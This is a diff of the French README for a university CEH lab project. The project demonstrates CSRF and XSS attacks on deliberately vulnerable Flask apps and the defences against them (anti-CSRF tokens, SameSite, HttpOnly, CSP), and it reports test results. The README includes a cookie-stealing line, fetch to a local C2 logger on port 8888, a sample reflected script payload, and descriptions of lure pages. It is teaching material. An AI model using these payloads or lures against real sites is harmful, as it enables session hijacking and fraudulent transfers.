@@ -3,177 +3,235 @@
 
 **Auteur :** Ayoub  
 **Formation :** Master 2 Ingénierie Informatique (M2I) - Semestre 3  
-**Module :** Cybersécurité Applicative & Certification CEH (*Certified Ethical Hacker*)  
-**Environnement :** Python 3.10+, Flask, Vanilla JavaScript, Pytest/Unittest  
+**Module :** Module 4 - Cybersécurité CEH (*Certified Ethical Hacker*)  
+**Environnement :** Python 3.10+, Flask, Vanilla JavaScript, Unittest  
 
 ---
 
 > [!IMPORTANT]
 > **Avertissement Éthique & Légal**  
-> L'ensemble du code source, des scripts d'exploitation et des démonstrations contenus dans cet espace de travail a été conçu à des **fins strictement pédagogiques et éducatives**. Les tests s'effectuent exclusivement en local (`127.0.0.1` / `localhost`) ou sur un réseau local privé autorisé (`LAN`). Tout usage malveillant sur des systèmes tiers sans consentement écrit est formellement illégal (Articles 323-1 et suivants du Code Pénal).
+> L'ensemble du code source, des scripts d'exploitation et des démonstrations contenus dans cet espace de travail a été conçu à des **fins strictement pédagogiques et éducatives**. Les tests s'effectuent exclusivement en local (`127.0.0.1` / `localhost`) ou sur un réseau local privé autorisé (`LAN`). Tout usage malveillant sur des systèmes tiers sans consentement écrit préalable est formellement illégal (Articles 323-1 et suivants du Code Pénal).
 
 ---
 
 ## 1. Vue d'Ensemble du Projet
 
-Ce projet constitue une plateforme complète d'apprentissage et de démonstration technique sur les vulnérabilités majeures du **Top 10 OWASP**, en se concentrant sur :
-1. **La falsification de requête intersites (CSRF - *Cross-Site Request Forgery*)** : étude en environnement mono-machine et en environnement distribué multi-machines (LAN).
-2. **L'injection de code indirecte (XSS - *Cross-Site Scripting*)** : étude des variantes réfléchie et stockée avec exfiltration de session en temps réel.
-3. **L'interaction critique CSRF ↔ XSS** : démonstration de la destruction des jetons anti-CSRF par le XSS et application du principe de **Défense en Profondeur**.
+Ce projet constitue une plateforme complète d'apprentissage et de démonstration technique sur deux des vulnérabilités les plus emblématiques du **Top 10 OWASP** :
+1. **La falsification de requête intersites (CSRF - *Cross-Site Request Forgery*)** :
+   - Étude mono-machine (`127.0.0.1` vs `localhost`).
+   - Étude distribuée multi-machines sur réseau local Wi-Fi / Ethernet (`LAN`).
+   - Démonstration de multiples vecteurs d'exploitation : méthode `GET`, formulaire `POST`, et balises multimédias `<img src="...">`.
+2. **L'injection de code indirecte (XSS - *Cross-Site Scripting*)** :
+   - XSS Réfléchi (*Reflected XSS*) via des paramètres de recherche HTTP `GET`.
+   - XSS Stocké (*Stored XSS*) persistant en base/mémoire via un livre d'or.
+   - Exfiltration en direct de cookies de session vers un serveur pirate d'écoute C2 (*Command & Control*).
+3. **L'interaction critique CSRF ↔ XSS** :
+   - Démonstration de la rupture du jeton anti-CSRF en présence d'une faille XSS.
+   - Application concrète du principe de **Défense en Profondeur**.
 
-Tous les modules ont été développés selon des standards industriels : **zéro dépendance lourde** (stockage mémoire transparent), **reproductibilité garantie**, **scripts d'automatisation Windows / Linux**, et **suites de tests unitaires automatisées validées**.
+Tous les modules respectent des standards industriels : **zéro dépendance externe lourde** (stockage transparent en mémoire vive), **reproductibilité garantie**, **scripts universels Windows (`run_demo.bat`)**, et **suites de tests unitaires automatisées (100% de réussite)**.
 
 ---
 
 ## 2. Cartographie de l'Espace de Travail
 
-Le répertoire racine regroupe trois sous-projets indépendants et complémentaires :
+Le répertoire racine `Exposé - CSRF & XSS/` est structuré en 4 pôles distincts :
 
 ```text
-Exposé - CSRF Attack/
+Exposé - CSRF & XSS/
 │
-├── 📁 csrf-tp/              # TP 1 : CSRF en environnement local (Mono-machine)
-│   ├── vulnerable/          # Application cible sans protection (Port 5000)
-│   ├── secure_token/        # Défense par Synchronizer Token Pattern (Port 5000)
-│   ├── secure_samesite/     # Défense par cookie SameSite=Strict & HttpOnly (Port 5000)
-│   ├── attacker/            # Page piège auto-soumise piege.html (Port 8081)
-│   ├── tests/               # Validation automatisée (unittest + requests)
-│   ├── run_demo.bat         # Lanceur rapide Windows (vulnerable | token | samesite)
-│   ├── PIPELINE_DEMO.txt    # Déroulé pas à pas pour l'exposé oral
-│   └── README.md            # Guide théorique et technique complet
+├── 📁 csrf-tp/                     # PÔLE 1 : CSRF Fondamental (Mono-Machine)
+│   ├── vulnerable/app.py           # Application bancaire vulnérable (Port 5000)
+│   ├── secure_token/app_secure.py  # Défense par Synchronizer Token Pattern (Port 5000)
+│   ├── secure_samesite/app_samesite.py # Défense par cookie SameSite=Strict & HttpOnly
+│   ├── attacker/piege.html         # Page piège leurre (Faux cadeau de 200 € sur Port 8081)
+│   ├── tests/test_csrf.py          # Suite de tests d'intégration (4/4 tests validés)
+│   ├── run_demo.bat                # Lanceur universel Windows (vulnerable | token | samesite)
+│   ├── PIPELINE_DEMO.txt           # Fiche de passage oral détaillée
+│   └── README.md                   # Documentation technique du TP 1
 │
-├── 📁 csrf-tp-lan/          # TP 2 : CSRF distribué en Réseau Local (Multi-machines)
-│   ├── vulnerable/          # Serveur Flask écoutant sur 0.0.0.0 (Port 5000)
-│   ├── secure_token/        # Défense par Token sur IP LAN
-│   ├── secure_samesite/     # Défense SameSite sur IP LAN (contexte Cross-Site natif)
-│   ├── attacker/            # Piège avec configuration dynamique de l'IP cible
-│   ├── tests/               # Tests automatisés sur l'interface réseau locale
-│   ├── run_server_victim.bat# Lanceur pour la Machine Victime
-│   ├── run_attacker.bat     # Lanceur pour la Machine Attaquante
-│   └── README.md            # Guide d'interconnexion réseau Wi-Fi / LAN
+├── 📁 csrf-tp-lan/                 # PÔLE 2 : CSRF Distribué (Multi-Machines Réseau Local)
+│   ├── vulnerable/app.py           # Serveur Flask écoutant sur 0.0.0.0 (Port 5000)
+│   ├── secure_token/app_secure.py  # Version sécurisée par Token en réseau LAN
+│   ├── secure_samesite/app_samesite.py # Version sécurisée par SameSite en réseau LAN
+│   ├── attacker/piege.html         # Piège avec ciblage dynamique d'IP de la victime
+│   ├── tests/test_lan_csrf.py      # Tests automatisés sur l'interface réseau (4/4 tests validés)
+│   ├── run_server_victim.bat       # Script à lancer sur la Machine A (Victime)
+│   ├── run_attacker.bat            # Script à lancer sur la Machine B (Attaquant)
+│   └── README.md                   # Guide d'interconnexion réseau LAN
 │
-└── 📁 xss-tp/               # TP 3 : Failles XSS & Exfiltration de Session C2
-    ├── vulnerable/          # Vulnérabilités Reflected (/search) & Stored (/guestbook)
-    ├── secure/              # Défenses : Échappement HTML + HttpOnly + Header CSP
-    ├── attacker/            # Serveur C2 d'écoute d'exfiltration de cookies (Port 8888)
-    ├── tests/               # Tests automatisés de non-régression XSS
-    ├── run_demo.bat         # Lanceur universel (vulnerable | secure)
-    ├── PIPELINE_DEMO.txt    # Fiche mémo des payloads à injecter
-    └── README.md            # Guide complet sur les mécanismes XSS & CSP
+├── 📁 csrf-tp-lan-2/               # PÔLE 3 : CSRF Multi-Scénarios Métiers (Séance de Cours)
+│   ├── 📁 1_scenario_get_recrutement/
+│   │   ├── app.py                  # Banque vulnérable avec mutation en GET (Port 5000)
+│   │   ├── app_secure.py           # Version sécurisée (Interdiction du GET + Token CSRF)
+│   │   ├── attacker/stage_recrutement.html # Fausse offre de stage PFE cyber (NexaSec - 1 650 €/mois)
+│   │   └── run_demo.bat            # Lanceur rapide du Scénario 1
+│   │
+│   ├── 📁 3_scenario_img_forum/
+│   │   ├── app.py                  # Portefeuille de micro-débits vulnérable (Port 5000)
+│   │   ├── app_secure.py           # Version sécurisée (POST obligatoire + Jeton)
+│   │   ├── attacker/forum_photo.html # Galerie photos Pinterest (PhotoSphere - Clic ou balise <img>)
+│   │   └── run_demo.bat            # Lanceur rapide du Scénario 2 (Images)
+│   │
+│   ├── PIPELINE_DEMO.txt           # Déroulé oral pas à pas pour la séance de cours
+│   └── README.md                   # Guide de référence des 2 scénarios métiers
+│
+└── 📁 xss-tp/                      # PÔLE 4 : Failles XSS & Vol de Session C2
+    ├── vulnerable/app.py           # Faille Réfléchie (/search) & Faille Stockée (/guestbook)
+    ├── secure/app_secure.py        # Défenses : Échappement HTML + Cookie HttpOnly + Header CSP
+    ├── attacker/logger_server.py   # Serveur pirate C2 recevant les cookies volés (Port 8888)
+    ├── tests/test_xss.py           # Suite de tests d'injection XSS (5/5 tests validés)
+    ├── run_demo.bat                # Lanceur universel Windows (vulnerable | secure)
+    ├── PIPELINE_DEMO.txt           # Fiche mémo des payloads à injecter en direct
+    └── README.md                   # Guide approfondi sur le XSS et la Content Security Policy
 ```
 
 ---
 
-## 3. Synthèse des Modules et Notions Clés
+## 3. Synthèse Technique Approfondie des Vulnérabilités
 
-### Module 1 : `csrf-tp` (Attaque CSRF Locale)
-- **Le problème historique** : Le navigateur attache aveuglément les cookies de session à toute requête sortante vers un domaine donné, même initiée depuis un site tiers malveillant.
-- **La SOP (Same-Origin Policy)** : Elle interdit la lecture de la réponse HTTP par le script tiers, mais **n'interdit pas l'écriture** (envoi du formulaire POST).
-- **Les deux contre-mesures implémentées** :
-  1. **Synchronizer Token Pattern** : Jeton cryptographique imprévisible (`secrets.token_hex(32)`) associé à la session et vérifié en temps constant (`secrets.compare_digest`).
-  2. **Cookie `SameSite=Strict`** : Le navigateur refuse de transmettre le cookie lors d'une navigation intersites. *(Démonstration de la nuance technique entre `127.0.0.1` et `localhost`)*.
+### A. L'Attaque CSRF (Cross-Site Request Forgery)
+* **Mécanisme fondamental** : Le navigateur attache **automatiquement** les cookies de session enregistrés à toute requête HTTP sortante dirigée vers le domaine cible, peu importe l'origine à l'initiative de la requête.
+* **Le rôle de la SOP (Same-Origin Policy)** : La SOP est une politique de **lecture** et non d'écriture. Un script hébergé sur `127.0.0.1:8081` ne peut pas lire le contenu de la page bancaire de `127.0.0.1:5000`, mais le navigateur l'autorise à envoyer un formulaire ou une requête `GET` modifiant les données côté serveur.
+* **Les 2 Défenses fondamentales** :
+  1. **Synchronizer Token Pattern** : Jeton cryptographiquement sécurisé (`secrets.token_hex(32)`) associé à la session utilisateur et injecté dans chaque formulaire légitime. Le pirate ne pouvant ni le deviner ni le lire (grâce à la SOP), toute requête forgée échoue avec un code **`403 Forbidden`**.
+  2. **Attribut de Cookie `SameSite=Strict`** : Le navigateur refuse d'expédier le cookie de session dès que la requête provient d'un autre site, neutralisant l'attaque avec un code **`401 Unauthorized`**.
 
-### Module 2 : `csrf-tp-lan` (Attaque CSRF Multi-Machines)
-- **Objectif** : Valider l'attaque sur un réseau physique réel entre deux équipements distincts (PC Victime `10.5.100.x` et PC Attaquant).
-- **Apport pédagogique** : Suppression de l'ambiguïté des ports locaux sur une même adresse IP. La séparation des adresses IP offre une démonstration grandeur nature de la frontière *Cross-Site*.
-
-### Module 3 : `xss-tp` (Cross-Site Scripting & Vol de Session)
-- **XSS Réfléchi (Reflected)** : Injection dans un paramètre d'URL non assaini, exécutée immédiatement chez la victime via un lien piégé.
-- **XSS Stocké (Stored)** : Injection persistante dans le livre d'or, infectant tout utilisateur consultant la page.
-- **Serveur C2 Pirate (Port 8888)** : Démonstration concrète du vol de `document.cookie` via `fetch()`.
-- **Défenses appliquées** : Échappement automatique (Contextual HTML Encoding), drapeau de sécurité **`HttpOnly`** (masquage de `document.cookie`), et en-tête **`Content-Security-Policy: default-src 'self'`**.
+### B. L'Attaque XSS (Cross-Site Scripting)
+* **Mécanisme fondamental** : L'attaquant injecte du code JavaScript malveillant dans l'application cible. Ce code est ensuite réémis par le serveur et interprété par le navigateur de la victime au sein du **contexte d'origine légitime** du site.
+* **Variantes démontrées** :
+  - **XSS Réfléchi (*Reflected*)** : Le payload est injecté dans un paramètre d'URL (ex: `/search?q=<script>...`) et immédiatement renvoyé sans assainissement.
+  - **XSS Stocké (*Stored / Persistant*)** : Le payload est enregistré durablement en base ou en mémoire (ex: livre d'or `/guestbook`) et infecte **chaque utilisateur** qui visite la page.
+* **Exfiltration de Cookie C2** : Démonstration du vol de `document.cookie` via `fetch('http://127.0.0.1:8888/?cookie=' + ...)` vers la console du pirate.
+* **Les Défenses appliquées** :
+  1. **Échappement contextuel (Entity Encoding)** : Les balises `<script>` sont converties en `&lt;script&gt;` inoffensives.
+  2. **Drapeau de cookie `HttpOnly=True`** : Interdit formellement à JavaScript d'accéder au cookie de session via `document.cookie`.
+  3. **Content Security Policy (CSP)** : En-tête HTTP (`default-src 'self'`) interdisant l'exécution de scripts inline ou vers des domaines tiers non autorisés.
 
 ---
 
-## 4. Matrice Comparative des Vulnérabilités & Défenses
+## 4. Matrice Comparative : CSRF vs XSS
 
-| Critère | CSRF (Cross-Site Request Forgery) | XSS (Cross-Site Scripting) |
+| Critère d'Analyse | CSRF (*Cross-Site Request Forgery*) | XSS (*Cross-Site Scripting*) |
 | :--- | :--- | :--- |
-| **Origine de la faille** | Confiance aveugle du serveur dans le navigateur de l'utilisateur. | Confiance aveugle du navigateur dans le code renvoyé par le serveur. |
-| **Lieu d'exécution** | Serveur cible (qui traite une requête légitime en apparence). | Navigateur client (qui exécute du JavaScript injecté). |
-| **Capacité de lecture** | **Nulle** (La SOP bloque la lecture de la réponse par le pirate). | **Totale** (Le script tourne dans l'origine du site cible). |
-| **Impact principal** | Action non consentie (virement, changement d'email/mot de passe). | Vol de session, défiguration, keylogging, bypass de CSRF. |
-| **Défense de référence** | **Token anti-CSRF** + Cookie `SameSite=Strict/Lax`. | **Échappement contextuel** + Cookie `HttpOnly` + **CSP**. |
+| **Origine de la vulnérabilité** | Confiance aveugle du serveur dans le navigateur de la victime. | Confiance aveugle du navigateur dans les données renvoyées par le serveur. |
+| **Lieu d'exécution** | **Sur le serveur cible** (qui traite l'ordre transmis par le navigateur). | **Dans le navigateur client** (qui interprète le JavaScript injecté). |
+| **Capacité de lecture des données** | **Aucune** (La SOP bloque la lecture de la réponse par le site attaquant). | **Totale** (Le script tourne dans l'origine et le DOM de la cible). |
+| **Besoins de l'attaquant** | Une victime connectée + un prétexte de clic / visite (Phishing). | Un champ de saisie non assaini ou une URL réfléchie non échappée. |
+| **Conséquences types** | Virement bancaire, changement d'email, modification d'adresse. | Vol de session, défiguration de site, keylogger, bypass de token CSRF. |
+| **Contre-mesures de référence** | **Jeton anti-CSRF** + Cookie `SameSite=Strict/Lax`. | **Échappement HTML** + Cookie `HttpOnly` + En-tête **CSP**. |
 
-> [!TIP]
-> **Le lien fatal entre XSS et CSRF :**  
-> Une protection anti-CSRF (même par token) devient **caduque** si le site présente une vulnérabilité XSS. Le script malveillant injecté sur le domaine légitime a le droit de lire le DOM, de subtiliser le jeton CSRF et de forger la requête en contournant la défense. D'où la nécessité absolue de la **défense en profondeur**.
+> [!CAUTION]
+> **Le Lien Fatal entre XSS et CSRF (Défense en Profondeur) :**  
+> Une protection anti-CSRF par jeton devient **totalement inefficace** si le site présente une vulnérabilité XSS. Le script malveillant injecté sur le domaine légitime a le droit de lire le DOM, de subtiliser le jeton CSRF et de soumettre la requête en toute légitimité. Sécuriser contre le CSRF impose donc d'éradiquer au préalable tout risque XSS.
 
 ---
 
-## 5. Guide d'Exécution Rapide (Cheat Sheet)
+## 5. Guide d'Exécution Rapide (Pour la Soutenance Orale)
 
-### A. Exécuter le TP CSRF (Mono-machine)
-```powershell
+### Pôle 1 : Démonstration CSRF Fondamentale (`csrf-tp`)
+```cmd
 cd "csrf-tp"
-# Lancer la version vulnérable :
+
+# Scénario Vulnérable (Victime http://127.0.0.1:5000 | Piège http://127.0.0.1:8081/piege.html)
 .\run_demo.bat vulnerable
-# Lancer la version sécurisée par Token :
+
+# Défense par Synchronizer Token (Rejet 403 Forbidden)
 .\run_demo.bat token
-# Lancer la version sécurisée par SameSite :
+
+# Défense par Cookie SameSite=Strict (Rejet 401 Unauthorized)
 .\run_demo.bat samesite
-# Exécuter la suite de tests :
+
+# Lancer la suite de tests automatisés (4/4 tests validés)
 python tests/test_csrf.py
 ```
 
-### B. Exécuter le TP CSRF (Multi-machines / LAN)
-```powershell
+### Pôle 2 : Démonstration CSRF Réseau Local (`csrf-tp-lan`)
+```cmd
 cd "csrf-tp-lan"
-# Sur la machine victime :
+
+# Sur le PC Victime (Machine A) :
 .\run_server_victim.bat vulnerable
-# Sur la machine attaquante :
+
+# Sur le PC Attaquant (Machine B) :
 .\run_attacker.bat
-# Exécuter la suite de tests LAN :
+
+# Validation automatisée sur l'adresse IP réseau locale réelle :
 python tests/test_lan_csrf.py
 ```
 
-### C. Exécuter le TP XSS & Vol de Session
-```powershell
+### Pôle 3 : Scénarios Métiers pour la Séance de Cours (`csrf-tp-lan-2`)
+```cmd
+# 1. Scénario GET (Offre de stage PFE NexaSec à 1 650 €/mois) :
+cd "csrf-tp-lan-2\1_scenario_get_recrutement"
+.\run_demo.bat vulnerable   # Virement de 500 € déclenché en GET au clic ou auto
+.\run_demo.bat secure       # Protection par rejet du GET & Token CSRF
+
+# 2. Scénario Image (Galerie Pinterest PhotoSphere) :
+cd "..\3_scenario_img_forum"
+.\run_demo.bat vulnerable   # Débit de 200 € au clic sur n'importe quelle photo
+.\run_demo.bat secure       # Protection par obligation du POST + Jeton
+```
+
+### Pôle 4 : Démonstration XSS & Vol de Session (`xss-tp`)
+```cmd
 cd "xss-tp"
-# Lancer la version vulnérable (Serveur Web 5000 + C2 Pirate 8888) :
+
+# Lancer l'application cible (Port 5000) et le serveur pirate C2 (Port 8888) :
 .\run_demo.bat vulnerable
-# Lancer la version sécurisée (Échappement + HttpOnly + CSP) :
+
+# Démontrer les défenses (Échappement, HttpOnly, Content-Security-Policy) :
 .\run_demo.bat secure
-# Exécuter la suite de tests XSS :
+
+# Lancer la suite de tests automatisés (5/5 tests validés) :
 python tests/test_xss.py
 ```
 
 ---
 
-## 6. Validation Industrielle et Qualité Logicielle
+## 6. Bilan des Tests Automatisés (Qualité & Non-Régression)
 
-Chaque module intègre sa propre suite de tests automatisés validant les scénarios d'attaque et de remédiation :
+L'ensemble des modules applicatifs a été validé programmatiquement avec **13/13 tests réussis (100% de succès)** :
 
 ```text
-[SUITE DE TESTS 1 : csrf-tp/tests/test_csrf.py]
-  - test_01_vulnerable_app_csrf_succeeds          -> [OK] (Email altéré)
-  - test_02_secure_token_blocks_forged_request    -> [OK] (Rejet 403 Forbidden)
-  - test_03_secure_token_legitimate_succeeds      -> [OK] (Validation 200 OK)
-  - test_04_secure_samesite_attribute_configured  -> [OK] (En-têtes & Rejet 401)
-  Résultat : 4/4 PASSÉ (100%)
+================================================================================
+ SUITE 1 : csrf-tp/tests/test_csrf.py
+--------------------------------------------------------------------------------
+ [OK] test_01_vulnerable_app_csrf_succeeds          (Attaque réussie, email altéré)
+ [OK] test_02_secure_token_blocks_forged_request    (Requête forgée rejetée 403)
+ [OK] test_03_secure_token_legitimate_succeeds      (Formulaire légitime accepté 200)
+ [OK] test_04_secure_samesite_attribute_configured  (En-têtes SameSite & Rejet 401)
+ Résultat : 4/4 PASSÉ en 3.34s
 
-[SUITE DE TESTS 2 : csrf-tp-lan/tests/test_lan_csrf.py]
-  - test_01_lan_vulnerable_app_receptive         -> [OK] (Validation sur IP 10.5.100.x)
-  - test_02_lan_secure_token_blocks              -> [OK] (Rejet 403)
-  - test_03_lan_secure_token_legit_works         -> [OK] (Validation 200)
-  - test_04_lan_samesite_configured             -> [OK] (Rejet 401)
-  Résultat : 4/4 PASSÉ (100%)
+================================================================================
+ SUITE 2 : csrf-tp-lan/tests/test_lan_csrf.py
+--------------------------------------------------------------------------------
+ [OK] test_01_lan_vulnerable_app_receptive         (Validation sur IP réseau réelle)
+ [OK] test_02_lan_secure_token_blocks              (Rejet 403 Forbidden)
+ [OK] test_03_lan_secure_token_legit_works         (Validation avec jeton LAN)
+ [OK] test_04_lan_samesite_configured             (Rejet 401 Unauthorized)
+ Résultat : 4/4 PASSÉ en 6.27s
 
-[SUITE DE TESTS 3 : xss-tp/tests/test_xss.py]
-  - test_01_reflected_xss_is_injected_raw         -> [OK] (Balise <script> non échappée)
-  - test_02_stored_xss_persists_in_guestbook     -> [OK] (Persistance du payload)
-  - test_03_vulnerable_cookie_missing_httponly   -> [OK] (Flag HttpOnly absent)
-  - test_04_secure_app_escapes_xss_payloads      -> [OK] (Encodage entités HTML)
-  - test_05_secure_app_enforces_httponly_and_csp -> [OK] (HttpOnly + CSP actifs)
-  Résultat : 5/5 PASSÉ (100%)
+================================================================================
+ SUITE 3 : xss-tp/tests/test_xss.py
+--------------------------------------------------------------------------------
+ [OK] test_01_reflected_xss_is_injected_raw         (Balise <script> réémise brute)
+ [OK] test_02_stored_xss_persists_in_guestbook     (Persistance du script malveillant)
+ [OK] test_03_vulnerable_cookie_missing_httponly   (Flag HttpOnly absent, vol possible)
+ [OK] test_04_secure_app_escapes_xss_payloads      (Encodage entités &lt;script&gt;)
+ [OK] test_05_secure_app_enforces_httponly_and_csp (Flags HttpOnly et CSP actifs)
+ Résultat : 5/5 PASSÉ en 3.30s
+================================================================================
+ TOTAL : 13/13 TESTS AUTOMATISÉS CONFORMES
 ```
 
 ---
 
-## 7. Références & Normes de Cybersécurité
+## 7. Références Officielles & Bibliographie
 
-- **OWASP Top 10** : A01:2021-Broken Access Control & A03:2021-Injection
-- **RFC 6265bis** : Cookies: HTTP State Management Mechanism (SameSite Attribute)
-- **RFC 7231** : Hypertext Transfer Protocol (HTTP/1.1): Semantics and Content (Idempotence des requêtes GET)
-- **W3C Content Security Policy Level 3** : Recommandations officielles pour la restriction des contextes d'exécution de scripts.
-
+* **OWASP Top 10:2021** :
+  - *A01:2021 – Broken Access Control* (Catégorie couvrant le CSRF).
+  - *A03:2021 – Injection* (Catégorie couvrant le XSS).
+* **RFC 6265bis** : *Cookies: HTTP State Management Mechanism* (Spécification officielle des attributs `SameSite=Strict/Lax/None` et `HttpOnly`).
+* **RFC 7231** : *Hypertext Transfer Protocol (HTTP/1.1): Semantics and Content* (Principe d'idempotence et d'innocuité des méthodes HTTP `GET`).
+* **W3C Content Security Policy Level 3** : Recommandations pour la mitigation des injections de scripts côté client.
